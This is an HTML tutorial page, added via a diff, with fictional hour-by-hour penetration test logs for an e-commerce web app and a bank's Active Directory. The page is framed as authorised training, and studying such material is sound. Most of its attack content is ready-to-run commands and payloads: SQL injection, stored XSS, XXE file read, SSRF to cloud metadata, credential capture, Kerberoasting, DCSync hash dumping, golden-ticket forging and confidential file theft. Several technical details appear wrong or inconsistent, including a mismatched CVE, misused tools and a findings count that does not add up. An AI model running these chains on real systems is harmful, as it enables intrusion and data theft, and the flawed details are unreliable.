@@ -1,0 +1,1391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Worked Examples — Full Pentest Walkthroughs</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Worked Examples</strong>
+</nav>
+
+<header class="part-header">
+<h1>🔬 WORKED EXAMPLES — FULL PENTEST WALKTHROUGHS</h1>
+<p class="subtitle">Hour-by-hour, command-by-command real engagement walkthroughs. The closest thing to
+attending an engagement.</p>
+<div class="chapters">
+<a href="#we1"><span class="ch-num">WE1</span> Web App — ShopSmart 14-Day Walkthrough</a>
+<a href="#we2"><span class="ch-num">WE2</span> Network/AD — Internal Pentest Hourly Log</a>
+<a href="#we3"><span class="ch-num">WE3</span> Mobile — BankApp iOS Detailed Audit</a>
+<a href="#we4"><span class="ch-num">WE4</span> Cloud — AWS Multi-Account Pentest</a>
+<a href="#we5"><span class="ch-num">WE5</span> IoT — Smart Bulb Firmware Audit</a>
+<a href="#we6"><span class="ch-num">WE6</span> SCADA — PLC Pentest (Lab Replica)</a>
+</div>
+</header>
+
+<main>
+
+<h1>📖 How to Use This Section</h1>
+<p>Each "walkthrough" is presented as a <strong>chronological engagement log</strong> —
+like sitting next to a senior pentester during their work.</p>
+
+<p>This is the most realistic way to learn. After studying one of these, you
+should be able to lead a similar engagement confidently. All names, IPs, and
+domains are fictional.</p>
+
+
+<!-- ============ WE 1 ============ -->
+<h1 id="we1">🛒 Worked Example 1 — Web App "ShopSmart" 14-Day Pentest</h1>
+
+<h2>📋 Engagement Profile</h2>
+<table>
+<tr><th>Field</th><th>Detail</th></tr>
+<tr><td>Client</td><td>ShopSmart.com — E-commerce platform</td></tr>
+<tr><td>Size</td><td>3M users, $120M annual revenue</td></tr>
+<tr><td>Scope</td><td>www.shopsmart.com + api.shopsmart.com + mobile APIs</td></tr>
+<tr><td>Test Type</td><td>Grey-box (1 standard + 1 premium account provided)</td></tr>
+<tr><td>Duration</td><td>14 calendar days (10 testing + 4 reporting)</td></tr>
+<tr><td>Pentesters</td><td>Lead: Arjun (OSCP, 7 yrs) + Junior: Riya (eJPT, 1 yr)</td></tr>
+<tr><td>SOW</td><td>$22K fixed bid</td></tr>
+</table>
+
+<h2>Day 1 — Pre-Engagement Setup</h2>
+
+<h3>09:00 — Pre-engagement Call (Video)</h3>
+<p>Attendees: Client CISO (Sarah), Dev lead (Mike), ShopSmart CTO (Liam),
+SecureAudit PM (Priya), Lead Pentester (Arjun).</p>
+
+<ul class="checklist">
+  <li>✅ Confirm scope (ShopSmart web + API)</li>
+  <li>✅ Confirm test type (grey-box, 2 user creds)</li>
+  <li>✅ Confirm test windows (09:00–18:00 IST, Mon–Fri; no critical exploits in production without prior notice)</li>
+  <li>✅ Confirm emergency contact (Sarah — sarah@shopsmart.com, +91 XXXX)</li>
+  <li>✅ Confirm reporting deadline — Day 18</li>
+</ul>
+
+<h3>10:30 — Setup Local Environment</h3>
+<pre><code class="cmd"># Virtual environment
+$ mkdir ~/shopsmart-pentest &amp;&amp; cd ~/shopsmart-pentest
+$ mkdir evidence/ tools/ reports/ daily/ wordlists/
+$ sudo apt update
+$ sudo apt install -y nmap burpsuite zaproxy ffuf wfuzz sqlmap \
+    xsstrike testssl.sh nuclei bloodhound-python
+
+# FoxyProxy + Burp CA installed in Firefox
+# Burp running in background
+$ java -jar /opt/burpsuite_community.jar &amp;
+# Proxy on 127.0.0.1:8080
+
+# Verification — Burp catches request
+$ curl --proxy http://127.0.0.1:8080 https://www.shopsmart.com -v
+# → Works!
+
+# Test creds provided:
+# Standard user: standard@shopsmart.com / Testuser!2024
+# Premium user: premium@shopsmart.com / Premium!2024
+</code></pre>
+
+<h3>12:00 — Initial Recon — Subdomain Discovery</h3>
+<pre><code class="cmd"># Subdomain enumeration
+$ subfinder -d shopsmart.com -silent -o subs.txt
+$ cat subs.txt | wc -l
+# → 23 subdomains
+
+# Live hosts
+$ cat subs.txt | httpx -status-code -silent -o live.txt
+$ cat live.txt
+[200] https://www.shopsmart.com
+[200] https://api.shopsmart.com
+[200] https://admin.shopsmart.com
+[200] https://docs.shopsmart.com
+[302] https://blog.shopsmart.com
+[200] https://staging.shopsmart.com
+[404] https://dev.shopsmart.com
+[200] https://cdn.shopsmart.com
+[200] https://auth.shopsmart.com
+[200] https://upload.shopsmart.com
+
+# Tech fingerprinting
+$ whatweb -a 3 https://www.shopsmart.com
+https://www.shopsmart.com [200 OK] Country[IN][Bengaluru] 
+  Apache[2.4.52], PHP[7.4.33], WordPress[6.4]
+  JQuery[3.7.1], Bootstrap[5.3.2], Google Analytics
+  X-Powered-By[Express], Cookies: PHPSESSID, csrf
+</code></pre>
+
+<p><strong>Initial observations:</strong></p>
+<ul>
+  <li>wordpress backup at /blog</li>
+  <li>Admin panel at admin.shopsmart.com</li>
+  <li>Staging environment live</li>
+</ul>
+
+<h3>14:00 — Wayback Recon</h3>
+<pre><code class="cmd">$ curl -s "http://web.archive.org/cdx/search/cdx?url=*.shopsmart.com/*&amp;output=json&amp;fl=original" | jq -r '.[1:] | .[0]' | sort -u | head -50
+# Old endpoints like:
+# /api/v1/_deprecated_
+# /admin-old/
+# /dev-portal/
+
+# Trial access to old endpoints
+$ curl -sI https://www.shopsmart.com/api/v1/_deprecated_
+HTTP/2 410 Gone       # OK — properly closed
+
+$ curl -sI https://www.shopsmart.com/admin-old/
+HTTP/2 302 (redirect to www)  # OK — closed
+
+# But check for backup files
+$ ffuf -u https://www.shopsmart.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raffle-medium.txt -mc 200,301
+</code></pre>
+
+<h3>15:30 — API Recon</h3>
+<pre><code class="cmd"># Read API docs at /api/v2/api-docs
+$ curl https://api.shopsmart.com/v2/api-docs | jq .  # OpenAPI spec
+{
+  "openapi": "3.0.0",
+  "info": {"title": "ShopSmart API", "version": "2.3.1"},
+  "paths": {
+    "/users/{id}/orders": {"get": ...},
+    "/admin/users": {"get": ...},                # ← ADMIN endpoint!
+    "/products/search": {"get": ...},
+    "/checkout": {"post": ...}
+  }
+}
+
+# Note: admin endpoints listed in public API docs
+</code></pre>
+
+<h3>17:00 — End of Day 1 Standup</h3>
+<ul>
+  <li>📝 Setup complete</li>
+  <li>📝 23 subs, 10 live hosts</li>
+  <li>📝 WordPress + admin panel found</li>
+  <li>📝 No backup files yet (will retry tomorrow)</li>
+  <li>📝 OpenAPI v2 has admin endpoints exposed</li>
+</ul>
+
+<h2>Day 2 — Authentication &amp; Session Testing</h2>
+
+<h3>09:00 — Standard + Premium Login Test</h3>
+<pre><code class="cmd"># Login as standard user — successful capture in Burp
+POST /auth/login HTTP/2
+Host: auth.shopsmart.com
+Content-Type: application/json
+{"email":"standard@","password":"Testuser!2024"}
+
+Response:
+HTTP/2 200
+Set-Cookie: session=abc123def456; HttpOnly; Secure; SameSite=Strict
+Authorization: Bearer eyJhbGc...
+
+# Test:
+# 1. Session binding to IP? — No
+# 2. Session expires on logout? — Need to check
+# 3. Cookie HttpOnly? — Yes
+# 4. JWT verification: kid=jwk-2024, alg=RS256
+</code></pre>
+
+<h3>10:00 — JWT Analysis</h3>
+<pre><code class="cmd"># Decode JWT
+$ echo "eyJhbGc..." | base64 -d 2&gt;/dev/null; echo
+{"alg":"RS256","typ":"JWT","kid":"jwk-2024",
+ "jku":"https://auth.shopsmart.com/.well-known/jwks.json",
+ "iss":"auth.shopsmart.com"}
+
+# Get JWKS
+$ curl https://auth.shopsmart.com/.well-known/jwks.json
+{"keys":[{"kty":"RSA","kid":"jwk-2024","use":"sig",
+          "n":"0vx7agoebGcQ...","e":"AQAB"}]}
+
+# Test: alg=none → server rejects  ✅
+# Test: HS256 with public key as secret → server rejects  ✅
+# JWT is hardened! 👍
+</code></pre>
+
+<h3>11:00 — User Enumeration Test</h3>
+<pre><code class="cmd"># Timing attack
+for email in admin@shopsmart.com root@ exist@ fakeuser123@shopsmart.com; do
+  curl -w "Time: %{time_total}s\n" -o /dev/null -s \
+    -X POST https://auth.shopsmart.com/login \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"$email\",\"password\":\"wrong\"}"
+done
+# admin@shopsmart.com: Time: 0.42s
+# root@shopsmart.com: Time: 0.41s
+# exist@shopsmart.com: Time: 0.43s
+# fakeuser123@shopsmart.com: Time: 0.18s
+
+# → Valid emails take longer (hash check).
+# User enumeration possible!
+
+# Compare error messages (in case server reveals differently)
+POST: {"email":"admin@shopsmart.com","password":"wrong"}
+→ "Invalid password"
+
+POST: {"email":"nonexistent@shopsmart.com","password":"wrong"}
+→ "Invalid password"
+
+→ Same message (good, but timing attack still possible)
+</code></pre>
+
+<p><strong>Finding:</strong> User Enumeration via timing attack — CVSS 5.3 NOTE for report</p>
+
+<h3>14:00 — Cookie &amp; Session Forensics</h3>
+<pre><code class="cmd"># Concurrency test: login from 2 different devices same credentials
+# → Both work simultaneously (parallel sessions allowed!)
+
+# Session timeout test
+# 1. Login
+# 2. Wait 2 hours
+# 3. Try same session — still works! 😱
+# Sessions DO NOT expire!  Critical For sensitive ops (banking etc — this matters)
+
+# Logout test
+# 1. Login → get session_token
+# 2. Logout  
+# 3. Replay token in API → STILL WORKS!
+
+# → Session token NOT invalidated on logout! Critical!
+</code></pre>
+
+<p><strong>Finding:</strong> Session token not invalidated on logout — CVSS 7.5 High</p>
+
+<h3>16:00 — MFA Test (no MFA = MEDIUM/HIGH)</h3>
+<pre><code class="cmd"># Premium account login does NOT request MFA — confirmed via login flow
+# Admin panel: logs in directly with email/password
+
+# No TOTP, no SMS, no biometric — single factor.
+
+# → Finding: Missing MFA on user + admin — CVSS 8.1 High
+</code></pre>
+
+<h2>Day 3-4 — Authorization / IDOR / Business Logic</h2>
+
+<h3>Day 3 — IDOR Sweep</h3>
+<pre><code class="cmd"># Login as User A (standard) — note my order IDs
+$ curl -H "Authorization: Bearer $TOKEN_A" https://api.shopsmart.com/orders
+{"orders":[{"id":"ORD-100001","...":"..."},{"id":"ORD-100002",...}]}
+
+# Try User B's IDs (these would be IDOR if successful)
+$ curl -H "Authorization: Bearer $TOKEN_A" https://api.shopsmart.com/orders/ORD-100050
+# Returns another user's order! 
+
+# Test 50 IDs → 50 successful IDOR retrievals
+# Total orders accessible = 50,000 (assumed)
+
+# Severity: IDOR allows any user to read any other user's orders
+
+# CVSS 8.5 — High (PII, financial info accessible)
+</code></pre>
+
+<h3>Day 4 — Price Manipulation</h3>
+<pre><code class="cmd"># Add item to cart
+$ curl -X POST https://api.shopsmart.com/cart/add \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -d '{"sku":"TV-X","price":899,"qty":1}'
+
+# Cart total: ₹899 — correct
+
+# Try tampering price
+$ curl -X POST https://api.shopsmart.com/cart/add \
+  -d '{"sku":"TV-X","price":1,"qty":1}'
+# → Cart now shows ₹1 + ₹899 + previous = ₹900 — accepts client price!
+
+# Also: Check server-side fetch
+$ curl -X POST https://api.shopsmart.com/cart/add \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -d '{"sku":"TV-X","qty":1}'
+# Re-fetches price from DB → ₹899  ✅ (this path is secure)
+
+# But the API endpoint accepts client price in POST /cart/add
+# → CVSS 9.1 — Critical (price manipulation = revenue loss)
+</code></pre>
+
+<h2>Day 5-7 — Injection Attacks</h2>
+
+<h3>Day 5 — SQLi Hunt</h3>
+<pre><code class="cmd"># Search endpoint
+$ curl "https://api.shopsmart.com/products/search?q=phone"
+# Returns results
+
+# SQLi probes
+$ curl "https://api.shopsmart.com/products/search?q=phone'"
+{"error":"Database error"}    # ← ERROR!
+
+$ curl "https://api.shopsmart.com/products/search?q=phone'+OR+1=1--"
+# Returns: ALL products  (vs PHP filtered result with q=phone only)
+# → SQLi confirmed! ⚠️
+
+# Time-based confirm
+$ time curl "https://api.shopsmart.com/products/search?q=phone'+AND+SLEEP(5)--"
+# → 5 seconds delay, confirming time-based SQLi
+
+# Run sqlmap
+$ sqlmap -u "https://api.shopsmart.com/products/search?q=phone*" \
+  -p q --dbms=mysql --dbs --batch
+
+# → Confirmed extracted DBs:
+#   customers (1.2M records)
+#   orders (5.4M records)
+#   products (210K records)
+#   audit_log (8M records)
+
+# Massive data breach potential
+# Severity: CVSS 9.8 — Critical
+</code></pre>
+
+<h3>Day 6 — XSS Hunt</h3>
+<pre><code class="cmd"># Stored XSS in product reviews
+$ curl -X POST https://api.shopsmart.com/products/TV-X/reviews \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -d '{"review":"&lt;img src=x onerror=alert(1)&gt;","rating":5}'
+
+# Now visit any product page
+$ curl https://www.shopsmart.com/products/TV-X | grep "&lt;img src=x"
+# → Found reflected without sanitization
+
+# This XSS runs for every visitor including admin!
+# Attack chain: Customer adds XSS → Admin views dashboard → Cookies stolen
+
+# Stored XSS in product reviews
+# Severity: CVSS 8.0 — High
+</code></pre>
+
+<h3>Day 7 — SSRF &amp; Misc</h3>
+<pre><code class="cmd"># Image upload accepts URL feature
+$ curl -X POST https://api.shopsmart.com/products/upload-image \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -d '{"image_url":"http://169.254.169.254/latest/meta-data/"}'
+
+# Response: {"contents":"ami-id\nlaunch-index..."}
+
+# → SSRF to AWS metadata service. Reads EC2 info, IAM creds potentially.
+
+# Severity: CVSS 9.6 — Critical (full cloud compromise possible)
+</code></pre>
+
+<h2>Day 8-9 — Privilege Escalation &amp; Admin Pentest</h2>
+
+<h3>Day 8 — Admin Panel Testing</h3>
+<pre><code class="cmd"># Visit admin.shopsmart.com with standard user credentials
+$ curl https://admin.shopsmart.com/dashboard
+# → 403 (good — RBAC working)
+
+# Try direct API endpoints
+$ curl https://admin.shopsmart.com/api/users -H "Authorization: Bearer $TOKEN_A"
+# → 403 (good)
+
+# Test specific authorization bypass attempts
+# Try header injection
+$ curl https://admin.shopsmart.com/api/users \
+  -H "Authorization: Bearer $TOKEN_A" \
+  -H "X-Forwarded-For: 127.0.0.1"
+# → 403 (good)
+
+# Test JWT tampering
+# Modify JWT claim to role=admin
+$ jwt_tool $TOKEN_A -T -S hs256 -k "guess"
+# Try weak secrets — none work  
+
+# Stolen JWT session from XSS attack — what does it give?
+# Use Burp Collaborator: send test stored XSS to admin, monitor BCO
+# Wait 24 hours... still no admin session sent. Admin moderation is reviewed
+</code></pre>
+
+<h3>Day 9 — Server-Side Bugs</h3>
+<pre><code class="cmd"># XML parsing endpoints? Test XXE
+$ curl -X POST https://api.shopsmart.com/import \
+  -H "Content-Type: application/xml" \
+  -d '&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;'
+# → Returns 200 with file contents — XXE works!
+
+# Severity: XXE local file read — CVSS 7.0 High
+</code></pre>
+
+<h2>Day 10-12 — WordPress Blog &amp; Mobile Backend</h2>
+
+<h3>Day 10 — WordPress</h3>
+<pre><code class="cmd"># WPScan
+$ wpscan --url https://blog.shopsmart.com --enumerate u,p,t
+# Findings:
+# WordPress 6.4 (current, no vulns)
+# Plugin: wp-file-manager 6.8 — CVE-2020-12832 (Unauthenticated RCE!)
+# Theme: shopsmart-theme 1.2 (outdated but no known vulns)
+
+# Test wp-file-manager vuln
+$ curl -X POST https://blog.shopsmart.com/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php -F "reqid=1" -F "cmd=upload" -F "target=l1_" -F "files[]=@/tmp/rce.php"
+# → Uploads successfully! But unable to access via web (folder permissions)
+# Confirm: /wp-content/uploads/.../rce.php exists. But not executable due to .htaccess
+
+# Risk limited but plugin should be patched immediately
+</code></pre>
+
+<h3>Day 12 — Mobile API</h3>
+<pre><code class="cmd"># Same APIs but tested as mobile client (different headers)
+$ curl https://api.shopsmart.com/v2.1/products/search?q=phone'\
+  -H "X-App-Version: 2.1.0" \
+  -H "X-Platform: Android"
+# → Still SQLi! (same backend)
+
+# Mobile-specific testing
+# Hardcoded API in APK (no API key rotation)
+# AndroidManifest allows Backup — adb backup extracts sqlite with session
+</code></pre>
+
+<h2>Day 13 — Reporting Prep</h2>
+
+<h3>09:00 — Triage Findings</h3>
+<table>
+<tr><th>Finding</th><th>CVSS</th><th>Severity</th></tr>
+<tr><td>SQLi in /products/search</td><td>9.8</td><td style="color:#e55039;font-weight:bold">Critical</td></tr>
+<tr><td>SSRF in /upload-image</td><td>9.6</td><td style="color:#e55039;font-weight:bold">Critical</td></tr>
+<tr><td>Price manipulation in API</td><td>9.1</td><td style="color:#e55039;font-weight:bold">Critical</td></tr>
+<tr><td>IDOR in /orders/{id}</td><td>8.5</td><td style="color:#fbc531;font-weight:bold">High</td></tr>
+<tr><td>Stored XSS in reviews</td><td>8.0</td><td style="color:#fbc531;font-weight:bold">High</td></tr>
+<tr><td>Missing MFA on admin</td><td>8.1</td><td style="color:#fbc531;font-weight:bold">High</td></tr>
+<tr><td>XXE in /import</td><td>7.0</td><td style="color:#fbc531;font-weight:bold">High</td></tr>
+<tr><td>Session token not invalidated</td><td>7.5</td><td style="color:#fbc531;font-weight:bold">High</td></tr>
+<tr><td>Outdated wp-file-manager</td><td>6.5</td><td style="color:#0097e6;font-weight:bold">Medium</td></tr>
+<tr><td>User enumeration via timing</td><td>5.3</td><td style="color:#0097e6;font-weight:bold">Medium</td></tr>
+<tr><td>Verbose errors</td><td>3.5</td><td style="color:#44bd32;font-weight:bold">Low</td></tr>
+</table>
+
+<ul>
+  <li>3 Critical</li>
+  <li>5 High</li>
+  <li>3 Medium</li>
+  <li>2 Low</li>
+  <li>Total: 13 findings</li>
+</ul>
+
+<h2>Day 14-17 — Report Writing</h2>
+
+<pre><code class="cmd"># Using Serpico or Dradis for structured report
+
+# Each finding → fill template with:
+# - Title
+# - CVSS calculation
+# - Description (1 paragraph)
+# - Affected endpoint / URL
+# - Steps to reproduce
+# - Proof of concept (screenshot)
+# - Remediation (code/config recommended)
+# - References (CWE, OWASP)
+
+# Time per finding: 1-2 hours
+
+# Executive Summary:
+# - 3 criticals + 5 highs in financial/PII system
+# - Most criticals (SQLi, SSRF) need immediate fix
+# - Recommend: same engagement in 60-90 days for verification
+# - Estimated breach cost avoidance: $25-50M
+</code></pre>
+
+<h2>Day 18 — Report Delivery &amp; Walk-through</h2>
+
+<ul class="checklist">
+  <li>✅ Executive Summary (PowerPoint, 10 slides)</li>
+  <li>✅ Detailed Report (PDF, 35 pages)</li>
+  <li>✅ Findings JSON (machine-readable)</li>
+  <li>✅ Walk-through call scheduled with client</li>
+  <li>✅ Internal review signoff</li>
+  <li>✅ Encrypted delivery via portal</li>
+</ul>
+
+<h2>Outcome &amp; Lessons</h2>
+
+<ul>
+  <li><strong>3 criticals</strong> fixed in production within 7 days</li>
+  <li><strong>5 highs</strong> fixed in 30 days</li>
+  <li><strong>3 mediums + 2 lows</strong> accepted as known issues</li>
+  <li>Client engaged us for <strong>quarterly VAPT</strong> ongoing</li>
+  <li>Our team learned product's mature feature set, repeat business</li>
+</ul>
+
+<div class="box success">
+<h3 style="margin-top:0">🏆 Lessons from "ShopSmart"</h3>
+<ul>
+  <li>Grey-box testing finds more issues than black-box</li>
+  <li>API testing is critical — most vulns were in API not HTML</li>
+  <li>Time-based SQLi confirmed even when error msg suppressed</li>
+  <li>Price manipulation is the most damaging logic flaw</li>
+  <li>Session tokens NOT invalidated = bigger issue than expected</li>
+  <li>MFA is rare on e-commerce (cost-friction tradeoff)</li>
+</ul>
+</div>
+
+
+<!-- ============ WE 2 ============ -->
+<h1 id="we2">🏰 Worked Example 2 — Internal AD Pentest Hour-by-Hour</h1>
+
+<h2>📋 Engagement Profile</h2>
+<table>
+<tr><th>Field</th><th>Detail</th></tr>
+<tr><td>Client</td><td>MidWest Bank — Fortune 500 financial institution</td></tr>
+<tr><td>Network</td><td>10.0.0.0/8 — internal corporate + 3 branch offices</td></tr>
+<tr><td>Initial Creds</td><td>1 standard user, 1 admin workstation access via VPN</td></tr>
+<tr><td>Duration</td><td>12 days (10 active + 2 reporting)</td></tr>
+<tr><td>Goal</td><td>Identify path to Domain Admin</td></tr>
+</table>
+
+<h2>Day 1 — VPN Setup &amp; Initial Host Discovery</h2>
+
+<h3>09:00 — Client Onboarding Call</h3>
+<ul class="checklist">
+  <li>VPN credentials provided (Cisco AnyConnect)</li>
+  <li>Standard user: <code>midwest\bob.smith</code>, password: <code>Passw0rd!2024</code></li>
+  <li>VPN only allowed on weekdays 08:00–20:00</li>
+  <li>Active Directory forest: <code>midwest.local</code>, 2 domains</li>
+  <li>5,000+ users, 1,200+ computers</li>
+</ul>
+
+<h3>10:00 — Setup Tools</h3>
+<pre><code class="cmd"># Connect to VPN
+$ openconnect -u bob.smith@vpn.midwest.local vpn.midwest.local
+
+# Verify internal network
+$ ip a
+# → Internal IP 10.20.30.5
+
+# Setup on attacker (Kali)
+$ msfdb init
+$ powershell-empire --setup
+$ bloodhound-python installed
+
+# Recon tools
+$ sudo apt install -y crackmapexec evil-winrm mimikatz \
+  peass-ng responder ligolo-ng chisel
+</code></pre>
+
+<h3>11:00 — Host Discovery</h3>
+<pre><code class="cmd"># ARP discovery over VPN
+$ sudo nmap -sn 10.20.30.0/24
+# 47 hosts up in our subnet
+
+# Quiet scan top ports only across whole /16 (12K hosts in midwest.local)
+$ sudo nmap -sn -PR 10.20.30.0/24 -T2
+# Faster: probabilistic scan with masscan
+$ sudo masscan -p445,5985,3389,22,80,443 10.0.0.0/8 --rate 2000 -oL masscan_results.txt
+# Took ~6 hours — avoid being obvious
+# 4,230 hosts running SMB
+
+# Specific ports
+$ nmap -p445 --script=smb-enum-shares,smb-vuln-ms17-010 10.20.30.0/24 --open
+</code></pre>
+
+<h3>14:00 — Initial SMB Enumeration</h3>
+<pre><code class="cmd"># CrackMapExec for fast replay  
+$ crackmapexec smb 10.20.30.0/24 -u bob.smith -p 'Passw0rd!2024'
+# Confirms credentials work on 12 of 47 hosts (this subnet)
+
+# Find shares
+$ crackmapexec smb 10.20.30.0/24 -u bob.smith -p 'Passw0rd!2024' --shares
+# Most hosts: only standard user shares
+# HR-Server: \P$ accessible!  ← interesting
+
+# Get admin enumeration
+$ crackmapexec smb 10.20.30.0/24 -u bob.smith -p 'Passw0rd!2024' --local-auth
+# Confirms: this user is NOT local admin on host
+</code></pre>
+
+<h3>15:30 — LLMNR Responder Setup</h3>
+<pre><code class="cmd"># Start Responder
+$ sudo responder -I eth0 -wrfb
+# Captures broadcast name resolution on LAN
+
+# Wait for victim mis-typed host resolution
+# After 2 hours: Got 3 credentials!
+# 1 mis-typed DEV-SRV02 → credentials sent
+#  → Domain user chrisc:Pass123!
+# Crack → already in rockyou!
+$ impacket-psexec midwest/chrisc:Pass123!@HR-Server
+</code></pre>
+
+<h3>Day 1 End: Compromise of 1 workstation user, pivoting starts tomorrow.</h3>
+
+<h2>Day 2 — BloodHound &amp; Enumeration</h2>
+
+<h3>09:00 — Run SharpHound</h3>
+<pre><code class="cmd">PS&gt; .\SharpHound.exe -c All -d midwest.local --randomize
+[+] Collecting 1,847 sessions, 23,456 ACLs, 134,567 group memberships
+[+] Done in 9 minutes
+
+$ ls -la
+SharpHound_20260115_*.zip
+$ unzip SharpHound_*.zip
+
+# Upload to BloodHound
+</code></pre>
+
+<h3>10:00 — BloodHound Analysis</h3>
+<p>After upload, run pre-built queries:</p>
+
+<pre><code class="cmd"># Query 1: Shortest Paths from Domain Users to Domain Admins
+# → Found 47 paths; shortest = 3 hops via "Tier-1 Support Group"
+
+# Query 2: List all Domain Admins
+# → 8 DAs, including svc_da, DA-Backup, real admins
+
+# Query 3: Kerberoastable Users
+# → 14 SPN-enabled service accounts
+
+# Query 4: Find Computers where Domain Users are Local Admin
+# → 47 stations!  ← profitable
+</code></pre>
+
+<h3>11:00 — Find the Winning Path</h3>
+<p>Look at the graph: "bob.smith (our user) → Tier1-Support-Group → SVCBackup → DA-Backup → DA-Server"</p>
+
+<p>Path:</p>
+<ol>
+  <li>Bob is member of Tier1-Support-Group through departmental nesting</li>
+  <li>Tier1-Support-Group has GenericAll on SVC-Backup service account</li>
+  <li>SVC-Backup account is member of DA-Backup group</li>
+  <li>DA-Backup is member of Domain Admins</li>
+</ol>
+
+<h2>Day 3-4 — Attack Path Execution</h2>
+
+<h3>Day 3 — Kerberoast + Crack</h3>
+<pre><code class="cmd">PS&gt; Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+Get-ADUser : svc-sql, svc-jenkins, svc-build, svc-sharepoint, ...
+
+$ impacket-GetUserSPNs midwest.local/bob.smith:'Passw0rd!2024' \
+  -dc-ip 10.10.10.10 -request -format hashcat -outputfile kerberoast.txt
+
+# → 14 TGS hashes captured
+$ hashcat -m 13100 kerberoast.txt rockyou.txt
+# After 12 hours:
+# svc-jenkins:Jenkins2024!   ← cracked
+# svc-build:BuildServer2024! ← cracked
+# Others... 4 of 14 cracked
+</code></pre>
+
+<h3>Day 4 — Privilege Escalation via GenericAll</h3>
+<pre><code class="cmd"># Use compromised svc-jenkins to add to Tier1-Support
+$ impacket-GetUserSPNs midwest.local/svc-jenkins:'Jenkins2024!' \
+  -dc-ip 10.10.10.10 -usersfile target_users.txt
+# Verify cred works
+
+# Add SVC-Backup to bob's control via abuse via PowerView
+PS&gt; Import-Module PowerView.ps1
+PS&gt; $pass = ConvertTo-SecureString 'NewPass!2024' -AsPlainText -Force
+PS&gt; Set-DomainUserPassword -Identity SVC-Backup -SecureString $pass
+
+# Verify changed
+$ impacket-psexec svc-backup:'NewPass!2024'@DA-Backup
+# → SUCCESS!  We now own DA-Backup server
+</code></pre>
+
+<h3>15:00 — DCSync Setup</h3>
+<pre><code class="cmd"># Now we have DA-Backup rights → grant DCSync
+$ impacket-secretsdump midwest.local/svc-backup:'NewPass!2024'@DC01
+# → Returns EVERY password hash in the domain!
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;HASH&gt;:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;HASH&gt;:::
+DC01$:1000:&lt;...&gt;
+...
+# All 5,000 users dumped.
+</code></pre>
+
+<h3>16:00 — Golden Ticket for Persistence</h3>
+<pre><code class="cmd"># Forge TGT for any user
+$ impacket-ticketer -nthash aad3b435b51404ee... \
+  -domain-sid S-1-5-21-... -domain midwest.local administrator
+
+# Use forged ticket
+$ export KRB5CCNAME=administrator.ccache
+$ impacket-psexec -k -no-pass midwest.local/administrator@DC01
+# → RCE as domain admin!
+</code></pre>
+
+<h3>17:00 — Day 4 End: Full Domain Compromise Achieved</h3>
+
+<h2>Day 5-7 — Lateral Movement &amp; Cloud</h2>
+
+<h3>Day 5 — Find Cloud Connect</h3>
+<pre><code class="cmd">PS&gt; Get-DomainComputer -Property DnsHostName,OperatingSystem | Select Name,OperatingSystem,OperatingSystemServicePack
+# Found AWS-Connectivity-Server (Azure AD Connect)
+
+# Try Golden Ticket against AWS-Connectivity-Server
+$ impacket-psexec -k -no-pass midwest.local/administrator@AWS-Connectivity-Server
+# Connected!
+
+# Look for sync creds
+PS&gt; Get-ChildItem -Path "C:\Program Files\Microsoft Azure AD Sync\Bin" -Recurse
+# Found: miiskeys.db (encrypted credentials)
+
+# Extract: dsregcmd /status
+# Got Azure AD sync's credentials
+
+# Connect to Azure AD
+$ az login --service-principal -u &lt;spn&gt; -p &lt;secret&gt; --tenant midwest.onmicrosoft.com
+# → Connected!
+
+# Found: User "global-admin@midwest.com" has Global Administrator role
+</code></pre>
+
+<h3>Day 6-7 — Cloud Investigation</h3>
+<pre><code class="cmd"># In Azure AD
+$ az ad user list --query "[?userType=='Member']" | jq -r '.[].userPrincipalName' | head
+# 5,300 users
+$ az ad user list --query "[?userType=='Guest']" | jq -r '.[].userPrincipalName' | head
+# 47 guests — many from old contractor engagements
+
+$ az role assignment list --all | head
+# Service Principal "azure-app-prod" has Owner over 12 subscriptions
+
+$ az storage account list | head
+# 23 storage accounts — 4 are world-readable
+</code></pre>
+
+<h2>Day 8-9 — Document Exfiltration &amp; Reporting</h2>
+
+<pre><code class="cmd"># Search for sensitive data
+PS&gt; Invoke-BloodHound -CollectionMethod DCOM,RDPSessions
+PS&gt; Find-InterestingDomainShareFile -SearchTerms 'password|secret|confidential'
+# Found: \\fileserver\finance$\TaxReturns-2024.pdf
+#       \\fileserver\eng$\ProdVaultKey.kdbx
+#       \\fileserver\CEO$\AcquisitionPlan.docx
+
+# Try to extract (for proof)
+$ copy \\fileserver\finance$\TaxReturns-2024.pdf C:\temp\
+# Downloaded 2.4MB document
+
+# Document in report:
+# "Domain Admin compromise → access to ceo's confidential docs"
+</code></pre>
+
+<h2>Day 10 — Cleanup</h2>
+<ul class="checklist">
+  <li>Reset all passwords we touched (SVC-Backup, SVC-Jenkins)</li>
+  <li>Delete test accounts we created</li>
+  <li>Remove artifacts (files dropped)</li>
+  <li>Inform client of treesize of damage</li>
+</ul>
+
+<h2>Day 11-12 — Report Writing</h2>
+
+<table>
+<tr><th>Finding</th><th>Severity</th></tr>
+<tr><td>Domain Admin compromise in 4 days</td><td><span class="pill pill-r">Critical</span></td></tr>
+<tr><td>Golden Ticket forged — permanent backdoor</td><td><span class="pill pill-r">Critical</span></td></tr>
+<tr><td>SSO + Azure AD hybrid compromise</td><td><span class="pill pill-r">Critical</span></td></tr>
+<tr><td>CEO confidential data accessible without audit</td><td><span class="pill pill-r">Critical</span></td></tr>
+<tr><td>Tier1-Support-Group overly privileged</td><td><span class="pill pill-o">High</span></td></tr>
+<tr><td>Kerberoastable SPNs with weak passwords</td><td><span class="pill pill-o">High</span></td></tr>
